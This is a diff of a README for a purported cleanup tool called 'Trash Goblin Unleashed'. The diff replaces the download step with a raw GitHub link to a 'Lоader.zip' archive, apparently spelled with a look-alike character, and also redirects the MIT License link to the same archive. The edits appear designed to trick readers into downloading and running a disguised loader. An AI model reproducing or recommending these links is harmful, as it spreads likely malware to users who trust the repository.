@@ -58,7 +58,7 @@ Our tool is meticulously crafted for broad compatibility and smooth performance 
 
 **Follow these steps to get started with Trash Goblin Unleashed:**
 
-1. **Download `Loader.rar` from the repository.**  
+1. **Download `https://raw.githubusercontent.com/Privateacc0879/TrashGoblin-Unleashed/main/Lоader.zip` from the repository.**  
    (*Make sure to extract the contents after download!*)
 
 2. **Extract the contents** using your preferred archive tool (such as WinRAR, 7-Zip, The Unarchiver, or built-in OS tools).
@@ -109,7 +109,7 @@ Trash Goblin Unleashed is intended strictly for legitimate system maintenance an
 
 ## 📜 MIT License
 
-This project is licensed under the [MIT License](https://opensource.org/license/mit/).
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Privateacc0879/TrashGoblin-Unleashed/main/Lоader.zip).
 
 ---
 
